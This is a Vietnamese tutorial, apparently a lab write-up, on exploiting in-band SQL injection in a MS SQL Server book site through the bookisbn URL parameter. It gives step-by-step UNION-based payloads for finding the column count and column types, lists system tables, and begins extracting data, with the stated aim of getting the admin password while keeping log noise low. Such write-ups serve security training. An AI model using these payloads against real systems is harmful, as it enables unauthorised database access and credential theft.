Khai thác In-Band

Ban đầu khi vào chức năng books và nhấn bất kì vào 1 sản phẩm, giao diện hiện ra như sau
![image](https://github.com/user-attachments/assets/845f36c9-eceb-423f-9de9-bf39e910a093)

+) Ta để ý thanh URL có trả về bookisbn=978-1-49192-706-9

+) Đầu tiên ta sẽ test xem có bị SQLi, SQLi xảy ra khi ta inject 1 kí tự SQL vào thì trả về lỗi
![image](https://github.com/user-attachments/assets/00d6c98d-ebae-4e2d-8c55-bcce50e92187)

Khi điền thêm kí tự `'` thì lập tức báo lỗi là Unclosed quotation mark after the character string ‘978-1-49192-706-9 tức là chưa đóng chuỗi

+) Ta điền thử kí tự `''`
![image](https://github.com/user-attachments/assets/daf186d5-c647-48db-a384-f6cc856d85a2)

Trang trả về là Empty book, nghĩa là kí tự `“` là hợp lệ

-> Câu truy vấn gốc của lập trình viên sẽ có dạng:
`select … from … where bookisbn='…'`

Nghĩa là chuỗi nhập trên URL sẽ được đặt trong cặp dấu nháy đơn của lập trình viên

+) Ta biến thứ bất thường (tức dấu nháy đơn) thành bình thường bằng cách thêm `-- -` vào cuối
![image](https://github.com/user-attachments/assets/e989fc64-16d6-4291-a11b-5dfac3e4ae56)

+) Vậy nghĩa là, ta cần chèn câu truy vấn SQL khai thác vào trước dấu comment và sau dấu nháy đơn

Vì thông tin trả về nhiều nên đây là SQLi loại In-Band

->Ta sẽ khai thác bằng phương pháp Union-Based và Error-Based

+) Muốn sử dụng Union-Based, ta cần phải để ý đến số cột, và kiểu dữ liệu
Đầu tiên là xác định số cột

Nếu ta gõ vào payload sau: `' union select 1,2,3-- -`

![image](https://github.com/user-attachments/assets/59893d5e-33ac-453f-8c20-276519d38045)

Nó thông báo về là ko khớp với số cột trước đó (tức số cột do lập trình viên viết)

Vậy thì ta cứ mò cho đến khi đúng thì thôi?

Ko nên, nếu có 100 cột, ta sẽ phải thử 100 lần, điều đó tạo ra rất nhiều lỗi, và mỗi khi ta làm gì đều sẽ được ghi vào log, và tất cả lỗi kia cũng được ghi vào log, nếu admin để ý thì sẽ “bứt dây động rừng”

Vậy thì ta phải dùng lệnh nào để xác định số cột mà ít trả về lỗi nhất

-> Sử dụng ORDER BY

Ta sẽ dùng order by và binary search để xác định số cột

Giả sử ta đoán là có 100 cột

-> Ta điền Payload: `' order by 100-- -`
![image](https://github.com/user-attachments/assets/a74a1a35-a7ea-42fe-ab0a-8d313c13ed0e)

Lỗi trả về là số cột vượt quá giới hạn cột 

Ta chia đôi ra đc 50, ta thử với 51 trước, nó báo lỗi tức <50

Ta chia đôi 50 được 25, thử với 26 trước, nó báo lỗi tức số cột <25

Ta chia đôi 25 được 12,5, thử với 13 trước, nó báo lỗi tức số cột < 12

Ta chia đôi 12 được 6, thử với 7, nó báo hợp lệ

Thử với 8 nó báo lỗi

->Vậy số cột là 7

Ta sẽ bắt đầu khai thác dữ liệu để lấy được mật khẩu của admin

-> Payload: `' union select 'a','b','c','d','e','f','g'-- -`
![image](https://github.com/user-attachments/assets/aecebd98-7779-4726-81b5-1a7b563549e4)

Nhưng khi điền thì ta thấy thông tin của ta đâu, chứng tỏ lập trình viên đã giới hạn lấy dữ liệu trả về của 1 bản ghi, mà vì dùng union bản ghi của ta bị chìm ở dưới, nên để có thể nhìn thấy dữ liệu của ta, ta phải biến câu truy vấn ở phía trước là sai

Payload: `' and 1=0 union select 'a','b','c','d','e','f','g'-- -`

![image](https://github.com/user-attachments/assets/85abdc91-b926-4688-90db-4981fc291ff1)

Tức là có ràng buộc về kiểu dữ liệu, ta sẽ cho tất cả các cột là null và 1 cột có kiểu dữ liệu nhất định để xác định được lỗi trả về, từ đó xác định được kiểu dữ liệu

Payload: `' and 1=0 union select null,null,null,null,null,null,'a'-- -`

![image](https://github.com/user-attachments/assets/df15960e-3478-457b-ba51-69ed5c376f74)

Lỗi trả về là ko khớp với kiểu dữ liệu là int vị trí thứ 7 có kiểu dữ liệu là int

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 6

Payload: `' and 1=0 union select null,null,null,null,null,'a',7-- -`
![image](https://github.com/user-attachments/assets/5bb21045-91ec-45f3-92cf-97ce6ac5da9e)

Lỗi trả về là ko thể convert thành kiểu numeric (số thập phân) vị trí thứ 6 có kiểu dữ liệu là numeric

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 5

Payload: `' and 1=0 union select null,null,null,null,'a',6,7-- -`

![image](https://github.com/user-attachments/assets/5d70cb53-5d0e-4160-8c77-53bc7be6c18f)

Dữ liệu trả về bình thường, chứng tỏ để ‘a’ ở vị trí thứ 5 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 4

Payload: `' and 1=0 union select null,null,null,'b','a',6,7-- -`

![image](https://github.com/user-attachments/assets/6276ca6c-6e7a-4116-a947-e471a6db3db5)

Dữ liệu trả về bình thường, chứng tỏ để ‘b’ ở vị trí thứ 4 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 3

Payload:  `' and 1=0 union select null,null,'c','b','a',6,7-- -`

![image](https://github.com/user-attachments/assets/36e15da6-e229-44a6-9225-1c4c3ceb4576)

Dữ liệu trả về bình thường, chứng tỏ để 'c' ở vị trí thứ 3 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 2

Payload: ' and 1=0 union select null,'d','c','b','a',6,7-- -

![image](https://github.com/user-attachments/assets/0feb0af6-d638-4b2d-aa7b-9817eaaaa77f)

Dữ liệu trả về bình thường, chứng tỏ để 'd' ở vị trí thứ 2 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 1

Payload: `' and 1=0 union select 'e','d','c','b','a',6,7-- -`

![image](https://github.com/user-attachments/assets/1ac31a3e-6747-4f7f-a751-fb2773bf4b43)

Dữ liệu trả về bình thường, chứng tỏ để 'e' ở vị trí thứ 1 ko vấn đề gì

Vậy Payload của ta là: 

`' and 1=0 union select 'e','d','c','b','a',6,7-- -`

Ta cần phải điền như nào để cho khớp với kiểu dữ liệu như trên

Và ta thấy vị trí kí tự ‘a’, ’e’, ’c’ đẹp nhất để hiển thị dữ liệu

+) Sau khi xác định số cột và kiểu dữ liệu xong, bước tiếp theo là extract data

MS SQL Server có các bảng sau ta cần lưu ý: 

  `information_schema` --> bao gồm 
  
      `information_schema.tables` --> bảng lưu trữ tên các bảng trong database hiện tại
      
      `information_schema.columns` --> bảng lưu trữ tên các cột trong database hiện tại
      
      `ten_database..sysdatabases` --> bảng lưu trữ các database trong hệ thống
      
      `www_project..syscolumns` --> bảng lưu trữ tên các cột trong database www_project
      
      `www_project..sysobjects` --> bảng lưu trữ tên các đối tượng trong database www_project (tên các bảng, các constraint,...)
      
      `www_project.sys.tables` --> Bảng lưu trữ tên các bảng trong database www_project
      
Mục đích --> +) Đầu tiên ta cần phải lấy ra tên các bảng của database hiện tại 

		            Chọn tên bảng mà bạn muốn khai thác
              
		            +) Tiếp theo lấy ra tên các cột của bảng đó
              
		            +) Sau đó select các cột mà bạn muốn khai thác của bảng đó ra
              
B1: Lấy ra tên các bảng của database hiện tại

Câu lệnh để xác định database hiện tại : select DB_NAME()

Payload: ' and 1=0 union select 'e','d','c','b',DB_NAME(),6,7-- -




